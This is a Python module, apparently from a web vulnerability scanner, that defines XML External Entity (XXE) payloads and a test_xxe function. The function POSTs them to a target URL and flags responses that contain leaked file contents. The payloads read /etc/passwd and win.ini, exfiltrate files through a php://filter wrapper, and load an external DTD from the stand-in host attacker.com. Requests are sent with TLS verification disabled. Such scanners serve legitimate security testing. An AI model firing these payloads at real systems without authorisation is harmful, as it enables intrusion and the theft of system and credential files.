import requests
from lxml import etree

# XXE (XML External Entity) payloads
XXE_PAYLOADS = [
    # Basic XXE
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
    
    # XXE with parameter entity
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root><data>test</data></root>''',
    
    # XXE for Windows
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
    
    # Blind XXE with external DTD
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root><data>test</data></root>''',
    
    # XXE with PHP wrapper
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>''',
]

# Signatures yang menandakan XXE berhasil
XXE_SIGNATURES = [
    "root:x:", "daemon:", "/bin/bash",  # Linux /etc/passwd
    "[extensions]", "[fonts]",           # Windows win.ini
    "<?php", "<?=",                      # PHP files
]

def test_xxe(url, params):
    """Test XML External Entity (XXE) injection."""
    results = []
    
    # Test pada parameter yang mungkin menerima XML
    xml_params = ["xml", "data", "content", "body", "payload"]
    test_params = [p for p in params.keys() if any(x in p.lower() for x in xml_params)]
    
    if not test_params:
        test_params = list(params.keys())[:1]  # Test first param
    
    for param in test_params:
        for payload in XXE_PAYLOADS:
            # Test via POST with XML content-type
            headers = {
                "Content-Type": "application/xml",
                "Accept": "application/xml, text/xml, */*"
            }
            
            try:
                # POST XML payload
                response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
                body = response.text.lower()
                
                # Check signatures
                for sig in XXE_SIGNATURES:
                    if sig.lower() in body:
                        results.append({
                            "type": "XML External Entity (XXE)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload[:100] + "...",
                            "detail": f"XXE successful - signature found: '{sig}'"
                        })
                        return results
                
                # Check for error messages
                xxe_errors = ["xml", "entity", "dtd", "external", "parser"]
                if any(err in body for err in xxe_errors) and len(body) > 100:
                    results.append({
                        "type": "Possible XXE (Error-based)",
                        "severity": "HIGH",
                        "param": param,
                        "payload": payload[:100] + "...",
                        "detail": "XML parser error detected - possible XXE vulnerability"
                    })
                    
            except requests.RequestException:
                pass
    
    return results
